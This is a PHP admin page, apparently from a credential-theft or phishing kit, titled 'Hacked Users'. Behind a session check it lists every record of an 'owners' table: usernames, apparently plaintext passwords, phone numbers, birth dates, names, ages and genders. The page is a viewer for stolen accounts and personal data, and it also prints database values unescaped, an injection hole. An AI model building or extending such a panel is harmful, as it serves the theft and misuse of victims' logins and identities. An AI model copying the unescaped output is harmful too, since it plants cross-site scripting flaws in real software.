<?php
session_start(); // Start the session

// Check if the user is not logged in, redirect them to the login page
if (!isset($_SESSION['sudo_username'])) {
    header("Location: index.php");
    exit();
}

require '../db.php';

// Fetch data from the database
$sql = "SELECT * FROM `owners`";
$result = mysqli_query($conn, $sql);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacked Users</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 0;
        }

        .container {
            margin: 20px auto;
            padding: 20px;
            border: 2px solid #0f0;
            background-color: #111;
            border-radius: 10px;
        }

        .card {
            background-color: #000;
            color: #0f0;
            border: 1px solid #0f0;
            border-radius: 5px;
            padding: 10px;
            margin-top: 20px;
        }

        .table {
            width: 100%;
            border-collapse: collapse;
        }

        .table th,
        .table td {
            border: 1px solid #0f0;
            padding: 8px;
            text-align: left;
        }

        .table th {
            background-color: #0f0;
            color: #000;
        }

        .table td {
            background-color: #000;
            color: #0f0;
        }

        @media screen and (max-width: 768px) {
            .container {
                padding: 10px;
            }

            .table {
                font-size: 14px;
            }

            .table th,
            .table td {
                padding: 6px;
            }
        }
    </style>
</head>
<body>
    <?php require 'navbar.php'; ?>
    <div class="container">
        <h1 class="text-strong">Hacked Users</h1>
        <div class="card">
            <?php if (mysqli_num_rows($result) > 0) : ?>
                <table class="table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Mobile</th>
                            <th>DOB</th>
                            <th>Name</th>
                            <th>Age</th>
                            <th>Gender</th>
                            <th>Created At</th>
                            <th>Updated At</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php while ($row = mysqli_fetch_assoc($result)) : ?>
                            <tr>
                                <td><?php echo $row['id']; ?></td>
                                <td><?php echo $row['username']; ?></td>
                                <td><?php echo $row['password']; ?></td>
                                <td><?php echo $row['phone_number']; ?></td>
                                <td><?php echo $row['date_of_birth']; ?></td>
                                <td><?php echo $row['name']; ?></td>
                                <td><?php echo $row['age']; ?></td>
                                <td><?php echo $row['gender']; ?></td>
                                <td><?php echo $row['created_at']; ?></td>
                                <td><?php echo $row['updated_at']; ?></td>
                            </tr>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            <?php else : ?>
                <p>No data found.</p>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
